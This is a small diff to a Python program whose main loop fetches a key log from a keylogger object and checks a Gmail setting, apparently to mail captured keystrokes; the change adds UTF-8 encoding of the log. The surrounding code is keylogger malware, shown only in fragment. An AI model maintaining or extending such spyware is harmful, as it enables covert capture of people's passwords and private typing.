@@ -65,6 +65,7 @@ class Main:
                 break
 
             key_log = self.keylogger.get_key_log()
+            key_log = key_log.encode("utf-8", errors="replace")
 
             if key_log != "":
                 if self.gmail == "":
